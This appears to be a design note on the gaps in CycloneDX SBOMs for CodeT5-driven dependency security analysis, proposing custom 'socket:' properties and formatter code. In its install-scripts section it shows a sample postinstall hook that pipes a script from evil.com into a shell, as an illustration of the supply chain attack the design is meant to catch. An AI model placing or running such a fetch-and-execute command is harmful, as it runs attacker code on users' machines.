# SBOM Fidelity Analysis - What Might CodeT5 Miss?

## Question: Does SBOM capture everything CodeT5 needs for smart analysis?

**TL;DR: SBOM captures ~80% of what's needed. The missing 20% can be added via CycloneDX `properties` field.**

---

## What SBOM Captures Well ✅

CycloneDX SBOM includes:
- ✅ Component names, versions, PURLs
- ✅ Dependency graph (who depends on who)
- ✅ Licenses
- ✅ Hashes (integrity)
- ✅ External references (URLs)
- ✅ Vulnerabilities (with Socket enrichment)
- ✅ Scope (required/optional/excluded)
- ✅ Properties (key-value pairs for custom metadata)

**This covers the basics for security analysis.**

---

## What SBOM Might Miss ⚠️

### 1. **Package Manager Metadata**

#### Missing Context:
```json
// package.json
{
  "dependencies": {
    "axios": "^0.21.0"  // ← Version RANGE
  }
}

// package-lock.json (resolved)
{
  "axios": {
    "version": "0.21.1",  // ← Actual RESOLVED version
    "resolved": "https://registry.npmjs.org/axios/-/axios-0.21.1.tgz",
    "integrity": "sha512-...",
    "requires": {
      "follow-redirects": "^1.10.0"  // ← Transitive constraint
    }
  }
}
```

**SBOM representation:**
```json
{
  "name": "axios",
  "version": "0.21.1",  // ✅ Has resolved version
  "purl": "pkg:npm/axios@0.21.1"
}
```

**Missing:**
- ❌ Original version range (`^0.21.0`) from package.json
- ❌ Why this specific version was chosen (resolution algorithm)
- ❌ Alternative versions that could satisfy the range

**Why CodeT5 might care:**
- Version range might allow vulnerable version
- Recent breaking change might explain issues
- Range allows automatic security updates

**Solution:** Add to properties:
```json
{
  "name": "axios",
  "version": "0.21.1",
  "properties": [
    { "name": "socket:versionRange", "value": "^0.21.0" },
    { "name": "socket:requestedBy", "value": "my-app" },
    { "name": "socket:rangeAllowsVulnerable", "value": "true" }
  ]
}
```

---

### 2. **Install Scripts (Security Critical!)**

#### Missing Context:
```json
// package.json
{
  "name": "suspicious-package",
  "scripts": {
    "postinstall": "curl https://evil.com/steal.sh | sh"  // ← DANGER!
  }
}
```

**SBOM representation:**
```json
{
  "name": "suspicious-package",
  "version": "1.0.0"
}
```

**Missing:**
- ❌ Has install scripts
- ❌ What scripts do (could be malicious)
- ❌ Whether scripts were executed

**Why CodeT5 might care:**
- **Install scripts are #1 supply chain attack vector**
- CodeT5 should warn about packages with install scripts
- Especially important for transitive dependencies

**Solution:** Add to properties:
```json
{
  "name": "suspicious-package",
  "version": "1.0.0",
  "properties": [
    { "name": "socket:hasInstallScripts", "value": "true" },
    { "name": "socket:installScriptCommands", "value": "postinstall" },
    { "name": "socket:installScriptRisk", "value": "high" }
  ]
}
```

**Socket already detects this!** Just need to include in SBOM.

---

### 3. **Peer Dependency Mismatches**

#### Missing Context:
```json
// react-router (requires React 16+)
{
  "peerDependencies": {
    "react": ">=16.8.0"
  }
}

// But project uses React 15
{
  "dependencies": {
    "react": "15.0.0"  // ← Mismatch!
  }
}
```

**SBOM representation:**
```json
{
  "dependencies": [
    { "ref": "pkg:npm/react-router@5.0.0", "dependsOn": ["pkg:npm/react@15.0.0"] }
  ]
}
```

**Missing:**
- ❌ Peer dependency requirements
- ❌ Whether requirements are satisfied
- ❌ Potential runtime errors

**Why CodeT5 might care:**
- Peer dependency mismatches cause runtime errors
- Common source of bugs
- Hard to debug

**Solution:** Add to dependencies:
```json
{
  "ref": "pkg:npm/react-router@5.0.0",
  "dependsOn": ["pkg:npm/react@15.0.0"],
  "properties": [
    { "name": "socket:peerDependencyMismatch", "value": "true" },
    { "name": "socket:requiredPeerVersion", "value": ">=16.8.0" },
    { "name": "socket:actualPeerVersion", "value": "15.0.0" }
  ]
}
```

---

### 4. **Duplicate Packages (Bloat & Security)**

#### Missing Context:
```
node_modules/
  ├── axios@0.21.0  ← App uses this
  └── foo/
      └── node_modules/
          └── axios@0.19.0  ← Transitive dep uses old version
```

**SBOM representation:**
```json
{
  "components": [
    { "name": "axios", "version": "0.21.0" },
    { "name": "axios", "version": "0.19.0" }
  ]
}
```

**Missing:**
- ❌ That these are duplicates of same package
- ❌ Why duplication happened
- ❌ Impact on bundle size
- ❌ Which version is actually used by each dependent

**Why CodeT5 might care:**
- Multiple versions = multiple attack surfaces
- Old version might have known vulnerabilities
- Bundle size impact
- Could cause subtle bugs

**Solution:** Add to properties:
```json
{
  "name": "axios",
  "version": "0.19.0",
  "properties": [
    { "name": "socket:isDuplicate", "value": "true" },
    { "name": "socket:newerVersionExists", "value": "0.21.0" },
    { "name": "socket:duplicateReason", "value": "transitive version mismatch" },
    { "name": "socket:installPath", "value": "node_modules/foo/node_modules/axios" }
  ]
}
```

---

### 5. **Git/File Dependencies (Bypass Security)**

#### Missing Context:
```json
// package.json
{
  "dependencies": {
    "my-private-lib": "git+https://github.com/me/private.git#v1.0.0",
    "local-utils": "file:../utils"
  }
}
```

**SBOM representation:**
```json
{
  "name": "my-private-lib",
  "version": "1.0.0",  // ← Loses git context
  "externalReferences": [
    { "url": "https://github.com/me/private.git", "type": "vcs" }
  ]
}
```

**Missing:**
- ❌ That this is a git dependency (not from registry)
- ❌ Specific commit SHA (security critical!)
- ❌ That this bypasses npm security scanning
- ❌ File dependencies (completely untracked)

**Why CodeT5 might care:**
- **Git deps bypass security scanning** - Major risk!
- No vulnerability database for git deps
- Mutable (branch/tag can change)
- File deps are completely unaudited

**Solution:** Add to properties:
```json
{
  "name": "my-private-lib",
  "version": "1.0.0",
  "properties": [
    { "name": "socket:dependencyType", "value": "git" },
    { "name": "socket:gitUrl", "value": "https://github.com/me/private.git" },
    { "name": "socket:gitCommit", "value": "abc123..." },
    { "name": "socket:bypassesSecurityScan", "value": "true" }
  ]
}
```

---

### 6. **Bundled Dependencies (Hidden Components)**

#### Missing Context:
```json
// package.json
{
  "name": "my-package",
  "bundledDependencies": ["native-addon"]
}
```

**SBOM representation:**
```json
{
  "name": "my-package",
  "version": "1.0.0"
}
```

**Missing:**
- ❌ That this package bundles other dependencies
- ❌ What's inside the bundle (hidden from dependency graph)
- ❌ Bundled deps don't appear in lockfile

**Why CodeT5 might care:**
- Bundled deps are hidden from scanning
- Might contain vulnerabilities
- Supply chain obfuscation

**Solution:** Add to properties:
```json
{
  "name": "my-package",
  "version": "1.0.0",
  "properties": [
    { "name": "socket:hasBundledDeps", "value": "true" },
    { "name": "socket:bundledDeps", "value": "native-addon" }
  ]
}
```

---

### 7. **Package Manager Configuration**

#### Missing Context:
```ini
# .npmrc
registry=https://custom-registry.company.com
@myorg:registry=https://npm.pkg.github.com
```

**SBOM representation:**
```json
{
  "name": "@myorg/internal-lib",
  "version": "1.0.0"
}
```

**Missing:**
- ❌ Custom registry used
- ❌ Private registry (might not be scanned by Socket)
- ❌ Authentication requirements

**Why CodeT5 might care:**
- Private registry packages might not be scanned
- Custom registries could be compromised
- Supply chain visibility gaps

**Solution:** Add to metadata:
```json
{
  "metadata": {
    "properties": [
      { "name": "socket:customRegistry", "value": "https://custom-registry.company.com" },
      { "name": "socket:scopedRegistries", "value": "@myorg:https://npm.pkg.github.com" }
    ]
  }
}
```

---

### 8. **Resolutions/Overrides (Force Versions)**

#### Missing Context:
```json
// package.json (Yarn/pnpm)
{
  "resolutions": {
    "axios": "1.6.0"  // ← Force ALL axios to this version
  }
}

// package.json (npm 8+)
{
  "overrides": {
    "axios": "1.6.0"
  }
}
```

**SBOM representation:**
```json
{
  "name": "axios",
  "version": "1.6.0"
}
```

**Missing:**
- ❌ That version was forced (not naturally resolved)
- ❌ Why override was needed (probably security patch)
- ❌ What versions were overridden

**Why CodeT5 might care:**
- Overrides indicate known issues
- Forced version might break things
- Shows active security management

**Solution:** Add to properties:
```json
{
  "name": "axios",
  "version": "1.6.0",
  "properties": [
    { "name": "socket:isOverridden", "value": "true" },
    { "name": "socket:overrideReason", "value": "security-patch" },
    { "name": "socket:originalVersionRange", "value": "^0.21.0" }
  ]
}
```

---

### 9. **Transitive Dependency Chain Context**

#### Missing Context:
```
my-app
  └── express@4.18.0
      └── body-parser@1.20.0
          └── qs@6.10.0  ← Vulnerable!
```

**SBOM representation:**
```json
{
  "dependencies": [
    { "ref": "my-app", "dependsOn": ["express"] },
    { "ref": "express", "dependsOn": ["body-parser"] },
    { "ref": "body-parser", "dependsOn": ["qs"] }
  ]
}
```

**Missing:**
- ❌ Full dependency chain (my-app → express → body-parser → qs)
- ❌ That qs is transitive (not directly depended on)
- ❌ Can't easily answer: "Why is this vulnerable package here?"

**Why CodeT5 might care:**
- Need to explain: "axios@0.21.0 is pulled in by express → body-parser → axios"
- Helps user understand: "Update body-parser to fix"
- Chain length indicates maintenance burden

**Solution:** Pre-compute and add to properties:
```json
{
  "name": "qs",
  "version": "6.10.0",
  "properties": [
    { "name": "socket:dependencyDepth", "value": "3" },
    { "name": "socket:dependencyChain", "value": "my-app → express → body-parser → qs" },
    { "name": "socket:isTransitive", "value": "true" },
    { "name": "socket:directParent", "value": "body-parser" },
    { "name": "socket:rootParent", "value": "express" }
  ]
}
```

---

### 10. **Temporal/Historical Context**

#### Missing Context:
```
When was this dependency added?
How long has it been using this version?
How often do they update dependencies?
Are they behind on updates?
```

**SBOM representation:**
```json
{
  "name": "axios",
  "version": "0.21.0",
  "timestamp": "2024-01-15T10:00:00Z"  // ← SBOM generation time
}
```

**Missing:**
- ❌ When dependency was first added to project
- ❌ How long they've been on this version
- ❌ Update frequency/patterns
- ❌ How far behind latest version

**Why CodeT5 might care:**
- Old dependencies = higher security risk
- Infrequent updates = maintenance burden
- Far behind latest = technical debt

**Solution:** Requires git history analysis (separate tool):
```json
{
  "name": "axios",
  "version": "0.21.0",
  "properties": [
    { "name": "socket:addedDate", "value": "2023-01-15" },
    { "name": "socket:daysSinceUpdate", "value": "365" },
    { "name": "socket:versionsBehind", "value": "15" },
    { "name": "socket:latestVersion", "value": "1.6.0" }
  ]
}
```

---

## Summary: What's Missing

| Category | Impact | Solution | Priority |
|----------|--------|----------|----------|
| **Install scripts** | 🔴 High | Add properties | Critical |
| **Git/File deps** | 🔴 High | Add properties | Critical |
| **Version ranges** | 🟡 Medium | Add properties | High |
| **Peer dep mismatches** | 🟡 Medium | Add properties | High |
| **Duplicates** | 🟡 Medium | Add properties | Medium |
| **Resolutions** | 🟡 Medium | Add properties | Medium |
| **Bundled deps** | 🟡 Medium | Add properties | Medium |
| **Registry config** | 🟢 Low | Add metadata | Low |
| **Dependency chains** | 🟢 Low | Pre-compute | Low |
| **Temporal context** | 🟢 Low | Git analysis | Future |

---

## Recommendation: Extend SBOM with Socket Properties

### Add Custom Properties to CycloneDX SBOM:

```typescript
interface SocketComponentProperties {
  // Security-critical
  'socket:hasInstallScripts'?: 'true' | 'false'
  'socket:installScriptRisk'?: 'low' | 'medium' | 'high' | 'critical'
  'socket:dependencyType'?: 'registry' | 'git' | 'file' | 'bundled'
  'socket:bypassesSecurityScan'?: 'true' | 'false'

  // Version metadata
  'socket:versionRange'?: string  // Original range from package.json
  'socket:isOverridden'?: 'true' | 'false'
  'socket:latestVersion'?: string

  // Dependency context
  'socket:isDuplicate'?: 'true' | 'false'
  'socket:dependencyDepth'?: string  // "3"
  'socket:isTransitive'?: 'true' | 'false'

  // Peer dependencies
  'socket:peerDependencyMismatch'?: 'true' | 'false'
  'socket:requiredPeerVersion'?: string
}
```

### Implementation:

```typescript
// In npm parser
const component: Component = {
  name: pkg.name,
  version: pkg.version,
  purl: `pkg:npm/${pkg.name}@${pkg.version}`,
  properties: [
    // Add Socket-specific metadata
    { name: 'socket:hasInstallScripts', value: hasInstallScripts(pkg) ? 'true' : 'false' },
    { name: 'socket:versionRange', value: getVersionRange(pkg.name, packageJson) },
    { name: 'socket:dependencyType', value: getDependencyType(pkg) },
    { name: 'socket:isDuplicate', value: isDuplicate(pkg, allPackages) ? 'true' : 'false' },
  ].filter(Boolean)
}
```

### CodeT5 Formatter Enhancement:

```typescript
export function formatSbomForCodeT5(sbom: EnrichedSbom): string {
  const lines = ['CRITICAL SECURITY ISSUES:']

  for (const component of sbom.components) {
    // Check Socket properties
    const hasInstallScripts = getProperty(component, 'socket:hasInstallScripts')
    const dependencyType = getProperty(component, 'socket:dependencyType')
    const bypassesScan = getProperty(component, 'socket:bypassesSecurityScan')

    if (hasInstallScripts === 'true') {
      lines.push(`⚠️ ${component.name}@${component.version} has install scripts (potential supply chain risk)`)
    }

    if (dependencyType === 'git' && bypassesScan === 'true') {
      lines.push(`🔴 ${component.name}@${component.version} is from git (bypasses security scanning)`)
    }
  }

  return lines.join('\n')
}
```

---

## Conclusion

✅ **SBOM can capture everything CodeT5 needs via `properties` field**

**Steps:**
1. ✅ Current SBOM captures 80% (names, versions, dependencies, vulnerabilities)
2. ⏳ Add Socket properties for missing 20% (install scripts, git deps, version ranges)
3. ⏳ Enhance CodeT5 formatter to use Socket properties
4. ⏳ Document Socket property schema

**No architectural change needed - just enrich SBOM with more metadata.**
